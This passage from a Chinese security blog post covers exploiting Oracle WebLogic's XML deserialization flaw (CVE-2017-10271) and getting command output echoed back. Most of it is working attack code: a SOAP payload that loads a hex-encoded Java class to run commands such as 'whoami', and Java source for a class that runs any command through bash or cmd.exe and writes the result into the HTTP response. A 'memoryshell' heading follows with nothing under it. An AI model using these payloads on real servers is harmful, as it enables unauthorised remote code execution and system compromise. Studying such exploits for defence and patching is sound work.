+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;weblogic.utils.Hex&quot;</span> <span class="attr">method</span>=<span class="string">&quot;fromHexString&quot;</span> <span class="attr">id</span>=<span class="string">&quot;cls&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>0xcafebabe0000003200670a001700350800360a003700380a0039003a08003b0a0039003c07003d0a0007003508003e0a0039003f0a003900400b004100420800430800440800450800460700470a001100480a001100490a0011004a0a004b004c07004d07004e0100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c650100047468697301001e4c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578703b010003736179010029284c6a6176612f6c616e672f537472696e673b294c6a6176612f696f2f496e70757453747265616d3b010003636d640100124c6a6176612f6c616e672f537472696e673b01000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100164c6f63616c5661726961626c65547970655461626c650100244c6a6176612f7574696c2f4c6973743c4c6a6176612f6c616e672f537472696e673b3e3b01000d537461636b4d61705461626c6507004f07005001000a457863657074696f6e7307005101000a536f7572636546696c6501000b586d6c4578702e6a6176610c001800190100076f732e6e616d650700520c0053005407004f0c0055005601000377696e0c005700580100136a6176612f7574696c2f41727261794c697374010004244e4f240c0059005a0c005b005c0700500c005d005e0100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c0018005f0c006000610c006200630700640c0065006601001c636f6d2f737570657265616d2f6578706c6f6974732f586d6c4578700100106a6176612f6c616e672f4f626a6563740100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100136a6176612f6c616e672f457863657074696f6e0100106a6176612f6c616e672f53797374656d01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b01000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a01000a73746172747357697468010015284c6a6176612f6c616e672f537472696e673b295a010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0021001600170000000000020001001800190001001a0000002f00010001000000052ab70001b100000002001b00000006000100000007001c0000000c000100000005001d001e00000001001f00200002001a0000016f000300070000009c043d1202b800034e2dc600112db600041205b60006990005033dbb000759b700083a042b1209b6000a99001319042b07b6000bb9000c020057a700441c9900231904120db9000c0200571904120eb9000c02005719042bb9000c020057a700201904120fb9000c02005719041210b9000c02005719042bb9000c020057bb0011591904b700123a05190504b60013571905b600143a061906b60015b000000004001b0000004a001200000012000200130008001400180015001a00180023001a002c001b003c001c0040001d004a001e0054001f00600021006a002200740023007d002600880027008f002800960029001c0000004800070000009c001d001e00000000009c0021002200010002009a00230024000200080094002500220003002300790026002700040088001400280029000500960006002a002b0006002c0000000c0001002300790026002d0004002e000000110004fd001a0107002ffc0021070030231c0031000000040001003200010033000000020034<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;org.mozilla.classfile.DefiningClassLoader&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>com.supeream.exploits.XmlExp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;cls&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;newInstance&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;say&quot;</span> <span class="attr">id</span>=<span class="string">&quot;proc&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>whoami<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getCurrentWork&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getResponse&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getServletOutputStream&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;writeStream&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;proc&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;flush&quot;</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;getWriter&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但我想直接回显，之后遇到加载字节码的地方直接用。</p>
+<p>按照12的思路调试之后发现10的版本回显似乎更简单</p>
+<p><img src="https://img.le1a.com/2022/05/08/e44bccb95c7d5.png" alt="1652018316999.png"></p>
+<p>getCurrentWork直接获取到了ServletRequestImpl，所以可以编写恶意类了</p>
+<p>（类型转换这里感觉有点怪怪的 但是能用就行）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.lang.Thread;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.HttpConnectionHandler;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.ServletRequestImpl;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.ServletResponseImpl;</span><br><span class="line"><span class="keyword">import</span> weblogic.servlet.internal.WebAppServletContext;</span><br><span class="line"><span class="keyword">import</span> weblogic.work.ExecuteThread;</span><br><span class="line"><span class="keyword">import</span> weblogic.work.WorkAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XmlExp2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XmlExp2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exp</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExecuteThread executeThread = (ExecuteThread) Thread.currentThread();</span><br><span class="line">        Object tmp = <span class="keyword">null</span>;</span><br><span class="line">        WebAppServletContext webAppServletContext = <span class="keyword">null</span>;</span><br><span class="line">        ServletRequestImpl servletRequest = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (executeThread.getCurrentWork().getClass().getName().contains(<span class="string">&quot;ServletRequestImpl&quot;</span>)) &#123;</span><br><span class="line">            tmp = executeThread.getCurrentWork();</span><br><span class="line">        &#125;</span><br><span class="line">        servletRequest = (ServletRequestImpl)tmp;</span><br><span class="line">        ServletResponseImpl servletResponse = servletRequest.getResponse();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="keyword">null</span> || cmd.trim().length() == <span class="number">0</span>) &#123;</span><br><span class="line">            cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            List cmds = <span class="keyword">new</span> ArrayList();</span><br><span class="line">            <span class="keyword">if</span> (cmd.startsWith(<span class="string">&quot;$NO$&quot;</span>)) &#123;</span><br><span class="line">                cmds.add(cmd.substring(<span class="number">4</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isLinux) &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmds.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                cmds.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                cmds.add(cmd);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ProcessBuilder processBuilder = <span class="keyword">new</span> ProcessBuilder(cmds);</span><br><span class="line">            processBuilder.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">            Process proc = processBuilder.start();</span><br><span class="line">            servletResponse.getServletOutputStream().writeStream(proc.getInputStream());</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.le1a.com/2022/05/08/57a95fa840af4.png" alt="1652020696499.png"></p>
+<h2 id="memoryshell"><a href="#memoryshell" class="headerlink" title="memoryshell"></a>memoryshell</h2>
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "https://fmyyy.gitee.io/2022/05/06/weblogicEcho/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "https://fmyyy.gitee.io/2022/05/06/weblogicEcho/";
+            const title         = "「weblogicEcho&&memoryshell」";
+            const excerpt       = `字节码加载CVE-2017-10271是xml反序列化，可用如下poc加载字节码
+123456789101112131415161718192021&lt;soapenv:Envelope xmlns:soapenv=&quot;ht...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2022-05-08</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" C3P0" href="/2022/05/05/c3p0/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" mark" href="/2022/05/06/mark/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/tou.jpg" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center">dddddddd</p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD"><span class="toc-text">字节码加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ECHO"><span class="toc-text">ECHO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12"><span class="toc-text">12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10"><span class="toc-text">10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memoryshell"><span class="toc-text">memoryshell</span></a></li></ol>
+    </div>
+</aside>
+                
+                    <div class="sticky-area">
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFwp/">CTFwp</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/codeql/">codeql</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/java/">java</a><span class="category-list-count">49</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/nodejs/">nodejs</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A1%86%E6%9E%B6/">框架</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a><span class="category-list-count">2</span></li></ul>
+  </aside>
+
+
+            
+                
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/06/mark/"><i class="fa  fa-book"></i> mark</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/06/weblogicEcho/"><i class="fa  fa-book"></i> weblogicEcho&&memoryshell</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/05/c3p0/"><i class="fa  fa-book"></i> C3P0</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/04/diary/"><i class="fa  fa-book"></i> 随便写写的日记</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2022/05/03/jep290/"><i class="fa  fa-book"></i> JEP290</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        <li><a href="mailto:254005846@qq.com"><i class="fa fa-envelope"></i></a></li>
+                        
+                        
+                        
+                        
+                        
+                        
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2022 fmyyy 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>
+    if (!window.kr) {
+        window.kr = {};
+    }
+    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
+    window.kr.siteRoot = "/";
+</script>
+
+    <div>
+        <canvas id="snow"></canvas>
+        <script async type="text/javascript" src="/js/snow.min.js"></script>
+    </div>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
